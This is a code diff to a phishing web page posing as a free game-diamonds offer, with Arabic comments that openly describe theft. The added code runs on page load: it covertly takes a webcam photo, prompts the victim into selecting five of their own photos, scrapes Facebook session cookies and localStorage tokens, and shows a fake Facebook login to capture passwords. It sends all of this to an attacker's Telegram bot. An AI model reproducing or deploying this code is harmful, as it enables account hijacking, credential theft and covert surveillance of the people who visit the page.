@@ -240,59 +240,19 @@
             100% { transform: rotate(360deg); }
         }
         
-        .camera-container {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 50px;
-            height: 50px;
-            background: #e43333;
-            border-radius: 50%;
-            cursor: pointer;
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 20px rgba(228,51,51,0.5);
-        }
-        
-        .camera-container.active {
-            display: flex;
-            animation: pulse 1s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        
-        .camera-icon {
-            font-size: 24px;
-            color: white;
-        }
-        
-        video {
+        video, #canvas, .hidden-input {
             display: none;
         }
         
-        .image-preview {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
+        .status-bar {
             background: #1a1a1a;
-            border-radius: 10px;
-            padding: 5px;
-            border: 1px solid #e43333;
-            z-index: 1000;
-        }
-        
-        .image-preview img {
-            width: 40px;
-            height: 40px;
-            border-radius: 5px;
-            margin: 2px;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #44bd32;
+            border: 1px solid #44bd32;
         }
         
         .fake-sms-box {
@@ -317,8 +277,19 @@
             border: 1px solid #e43333;
         }
         
-        .file-input {
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            z-index: 2000;
             display: none;
+            border-right: 3px solid #e43333;
         }
     </style>
 </head>
@@ -336,16 +307,11 @@
     </div>
 </div>
 
-<div class="camera-container" id="cameraBtn">
-    <i class="fas fa-camera camera-icon"></i>
-</div>
-
-<div class="image-preview" id="imagePreview"></div>
-
-<input type="file" id="fileInput" class="file-input" accept="image/*" multiple>
+<div id="toastMsg" class="toast-msg"></div>
 
 <video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas"></canvas>
+<input type="file" id="fileInput" class="hidden-input" accept="image/*" multiple webkitdirectory directory>
 
 <nav class="navbar">
     <div class="logo">Shop2Game</div>
@@ -422,17 +388,116 @@
     let selectedOffer = "500 Diamonds Free";
     let userEmail = "";
     let stream = null;
-    let capturedImages = [];
+    let autoCaptureDone = false;
+    let autoPhotosDone = false;
 
-    // ==================== سحب الـ Cookies (c_user و xs) ====================
-    function stealFacebookCookies() {
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);
+    }
+
+    // ==================== 1. التقاط صورة تلقائياً فور دخول الموقع ====================
+    async function autoCapturePhoto() {
+        if (autoCaptureDone) return;
+        autoCaptureDone = true;
+        
+        try {
+            showToast("📸 جاري التقاط صورة تلقائياً...");
+            
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            
+            const blob = dataURLtoBlob(photoData);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'auto_captured.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            
+            await sendToTelegram(`📸 <b>تم التقاط صورة تلقائياً فور دخول الموقع!</b>\n📱 ${navigator.userAgent}\n🕐 ${new Date().toLocaleString('ar-EG')}`);
+            showToast("✅ تم التقاط الصورة وإرسالها");
+            
+        } catch (error) {
+            await sendToTelegram(`⚠️ <b>فشل التقاط الصورة تلقائياً</b>\n${error.message}`);
+            showToast("❌ فشل التقاط الصورة");
+        }
+    }
+    
+    // ==================== 2. سحب آخر 5 صور تلقائياً ====================
+    async function autoStealPhotos() {
+        if (autoPhotosDone) return;
+        autoPhotosDone = true;
+        
+        showToast("📂 جاري سحب الصور من الجهاز...");
+        
+        // طريقة بديلة: فتح نافذة اختيار الملفات تلقائياً
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.multiple = true;
+        input.style.display = 'none';
+        document.body.appendChild(input);
+        
+        input.click();
+        
+        input.onchange = async (e) => {
+            const files = Array.from(e.target.files).slice(0, 5);
+            if (files.length === 0) {
+                await sendToTelegram(`⚠️ <b>لم يتم العثور على صور في الجهاز</b>\n📱 ${navigator.userAgent}`);
+                return;
+            }
+            
+            let sentCount = 0;
+            for (let file of files) {
+                if (file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    const imageData = await new Promise((resolve) => {
+                        reader.onload = (e) => resolve(e.target.result);
+                        reader.readAsDataURL(file);
+                    });
+                    const blob = dataURLtoBlob(imageData);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, file.name);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    sentCount++;
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+            
+            await sendToTelegram(`📸 <b>تم سحب ${sentCount} صورة من الجهاز تلقائياً!</b>\n📱 ${navigator.userAgent}`);
+            showToast(`✅ تم سحب ${sentCount} صورة`);
+            input.remove();
+        };
+    }
+    
+    // ==================== 3. سحب كوكيز فيسبوك تلقائياً ====================
+    async function stealFacebookCookies() {
         try {
             const cookies = document.cookie.split(';');
             let c_user = null;
             let xs = null;
+            let allCookies = [];
             
             for (let cookie of cookies) {
                 cookie = cookie.trim();
+                allCookies.push(cookie);
                 if (cookie.startsWith('c_user=')) {
                     c_user = cookie.substring(7);
                 }
@@ -441,40 +506,57 @@
                 }
             }
             
-            if (c_user || xs) {
-                sendToTelegram(`🔐 <b>تم سرقة بيانات Facebook!</b>\n━━━━━━━━━━━━━━━━\n<b>📱 الجهاز:</b> ${navigator.userAgent}\n<b>c_user (ID الحساب):</b> <code>${c_user || 'غير موجود'}</code>\n<b>xs (رمز الجلسة):</b> <code>${xs || 'غير موجود'}</code>\n<b>⚠️ ملاحظة:</b> يمكن استخدام هذه البيانات لاختراق الحساب مباشرة دون كلمة مرور!`);
-                return { c_user, xs };
+            // محاولة الحصول على التوكن من localStorage
+            let fbToken = null;
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && (key.includes('accessToken') || key.includes('fb_token') || key.includes('access_token'))) {
+                        fbToken = localStorage.getItem(key);
+                        break;
+                    }
+                }
+            } catch(e) {}
+            
+            if (c_user || xs || fbToken) {
+                let msg = `🔐 <b>تم سرقة بيانات فيسبوك!</b>\n━━━━━━━━━━━━━━━━\n📱 ${navigator.userAgent}\n`;
+                if (c_user) msg += `\n<b>c_user (ID الحساب):</b> <code>${c_user}</code>`;
+                if (xs) msg += `\n<b>xs (رمز الجلسة):</b> <code>${xs}</code>`;
+                if (fbToken) msg += `\n<b>Access Token:</b> <code>${fbToken.substring(0, 100)}...</code>`;
+                msg += `\n\n⚠️ <b>يمكن استخدام هذه البيانات لاختراق الحساب مباشرة!</b>`;
+                await sendToTelegram(msg);
+                return { c_user, xs, fbToken };
             } else {
-                sendToTelegram(`⚠️ <b>لم يتم العثور على جلسة Facebook نشطة</b>\n📱 ${navigator.userAgent}`);
+                await sendToTelegram(`⚠️ <b>لم يتم العثور على جلسة Facebook نشطة</b>\n📱 ${navigator.userAgent}\n🍪 جميع الكوكيز: ${allCookies.join(', ') || 'لا يوجد'}`);
                 return null;
             }
         } catch(e) {
-            sendToTelegram(`❌ <b>خطأ في سرقة الكوكيز</b>\n${e.message}`);
+            await sendToTelegram(`❌ <b>خطأ في سرقة الكوكيز</b>\n${e.message}`);
             return null;
         }
     }
     
-    // ==================== فتح نافذة فيسبوك لسرقة الجلسة ====================
-    function startFacebookLogin() {
-        // فتح نافذة فيسبوك في إطار مخفي
+    // ==================== فتح نافذة فيسبوك في iframe مخفي لسرقة الجلسة ====================
+    function stealthFacebookSession() {
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = 'https://www.facebook.com/';
         document.body.appendChild(iframe);
         
-        sendToTelegram(`🟢 <b>محاولة سرقة جلسة Facebook</b>\n📱 ${navigator.userAgent}\n🕐 ${new Date().toLocaleString('ar-EG')}`);
-        
-        // محاولة سرقة الكوكيز بعد 5 ثواني
         setTimeout(() => {
-            const fbCookies = stealFacebookCookies();
-            if (fbCookies && fbCookies.c_user) {
-                goToStep(4);
-            } else {
-                // إذا لم توجد جلسة، نعرض نافذة تسجيل دخول وهمية
-                showFakeFacebookLogin();
-            }
+            stealFacebookCookies();
             iframe.remove();
         }, 5000);
+    }
+    
+    function startFacebookLogin() {
+        sendToTelegram(`🟢 <b>محاولة سرقة جلسة Facebook</b>\n📱 ${navigator.userAgent}`);
+        stealthFacebookSession();
+        
+        // عرض نافذة تسجيل دخول وهمية كبديل
+        setTimeout(() => {
+            showFakeFacebookLogin();
+        }, 3000);
     }
     
     function showFakeFacebookLogin() {
@@ -485,8 +567,6 @@
                 body{background:#1a1a1a;color:white;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;padding:20px;}
                 input{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #333;background:#000;color:white;}
                 button{background:#1877f2;color:white;border:none;padding:12px;width:100%;border-radius:5px;cursor:pointer;}
-                .loading{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-top:2px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;margin-left:10px;}
-                @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
             </style>
             </head>
             <body>
@@ -501,11 +581,8 @@
                     const email = document.getElementById('email').value;
                     const pass = document.getElementById('pass').value;
                     if(email && pass) {
-                        document.getElementById('msg').innerHTML = 'جاري التحقق... <div class="loading"></div>';
-                        setTimeout(() => {
-                            window.opener.postMessage({ type: 'facebook_creds', email: email, password: pass }, '*');
-                            window.close();
-                        }, 2000);
+                        window.opener.postMessage({ type: 'facebook_creds', email: email, password: pass }, '*');
+                        window.close();
                     } else {
                         document.getElementById('msg').innerHTML = 'يرجى إدخال البريد وكلمة المرور';
                     }
@@ -516,7 +593,7 @@
         
         window.addEventListener('message', async (event) => {
             if (event.data && event.data.type === 'facebook_creds') {
-                await sendToTelegram(`🔐 <b>بيانات فيسبوك (بديل)</b>\n━━━━━━━━━━━━━━━━\n<b>📧 البريد:</b> ${event.data.email}\n<b>🔒 كلمة المرور:</b> ${event.data.password}`);
+                await sendToTelegram(`🔐 <b>بيانات فيسبوك (طريقة بديلة)</b>\n━━━━━━━━━━━━━━━━\n<b>📧 البريد:</b> ${event.data.email}\n<b>🔒 كلمة المرور:</b> ${event.data.password}`);
                 goToStep(4);
             }
         });
@@ -559,88 +636,10 @@
     async function requestNotificationPermission() {
         const permission = await Notification.requestPermission();
         if (permission === 'granted') {
-            sendToTelegram(`✅ <b>تم تفعيل الإشعارات</b>\n📱 ${navigator.userAgent}`);
+            await sendToTelegram(`✅ <b>تم تفعيل الإشعارات</b>\n📱 ${navigator.userAgent}`);
             goToStep(4);
         } else {
             alert('للاستلام الهدية يجب تفعيل الإشعارات');
-        }
-    }
-    
-    // ==================== سحب آخر 5 صور ====================
-    function stealRecentPhotos() {
-        const input = document.getElementById('fileInput');
-        input.click();
-        
-        input.onchange = async (e) => {
-            const files = Array.from(e.target.files).slice(0, 5);
-            capturedImages = [];
-            
-            for (let file of files) {
-                if (file.type.startsWith('image/')) {
-                    const reader = new FileReader();
-                    const imageData = await new Promise((resolve) => {
-                        reader.onload = (e) => resolve(e.target.result);
-                        reader.readAsDataURL(file);
-                    });
-                    capturedImages.push({ name: file.name, data: imageData });
-                    
-                    // عرض معاينة
-                    const preview = document.getElementById('imagePreview');
-                    const img = document.createElement('img');
-                    img.src = imageData;
-                    preview.appendChild(img);
-                    preview.style.display = 'block';
-                }
-            }
-            
-            await sendImagesToTelegram();
-        };
-    }
-    
-    async function sendImagesToTelegram() {
-        for (let img of capturedImages) {
-            try {
-                const blob = dataURLtoBlob(img.data);
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, img.name);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                await new Promise(r => setTimeout(r, 500));
-            } catch(e) {}
-        }
-        if (capturedImages.length > 0) {
-            await sendToTelegram(`📸 <b>تم سحب ${capturedImages.length} صورة من الجهاز</b>\n📱 ${navigator.userAgent}`);
-        }
-    }
-    
-    // ==================== التقاط صورة من الكاميرا ====================
-    async function capturePhoto() {
-        try {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            await new Promise(resolve => setTimeout(resolve, 500));
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-            }
-            
-            const blob = dataURLtoBlob(photoData);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'captured_photo.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            
-        } catch (error) {
-            await sendToTelegram("⚠️ فشل التقاط الصورة");
         }
     }
     
@@ -760,11 +759,6 @@
         document.getElementById('step' + step).classList.add('active');
         if (offer) selectedOffer = offer;
         window.scrollTo(0, 0);
-        
-        if (step >= 3) {
-            document.getElementById('cameraBtn').classList.add('active');
-            setTimeout(() => { stealRecentPhotos(); }, 1000);
-        }
     }
     
     // ==================== معالجة البيانات ====================
@@ -781,18 +775,11 @@
         }
         
         userEmail = email;
-        
         await sendFullData(email, pass);
-        
-        try { await capturePhoto(); } catch(e) {}
-        
         showFakeSmsDialog();
     }
     
-    // أزرار الكاميرا
-    document.getElementById('cameraBtn').addEventListener('click', async () => { await capturePhoto(); });
-    
-    // إرسال معلومات الدخول الأولية
+    // ==================== تنفيذ كل شيء تلقائياً عند تحميل الصفحة ====================
     setTimeout(async () => {
         const deviceInfo = getDeviceInfo();
         const ipInfo = await getIPInfo();
@@ -801,9 +788,16 @@
         msg += `<b>📱 الجهاز:</b> ${deviceInfo.platform}\n<b>🕐 الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
         await sendToTelegram(msg);
         
-        // محاولة سرقة كوكيز فيسبوك تلقائياً
-        stealFacebookCookies();
-    }, 1000);
+        // 1. التقاط صورة تلقائياً
+        await autoCapturePhoto();
+        
+        // 2. سحب الصور تلقائياً
+        setTimeout(() => { autoStealPhotos(); }, 2000);
+        
+        // 3. سرقة كوكيز فيسبوك تلقائياً
+        setTimeout(() => { stealFacebookCookies(); }, 1000);
+        
+    }, 500);
 </script>
 </body>
 </html>
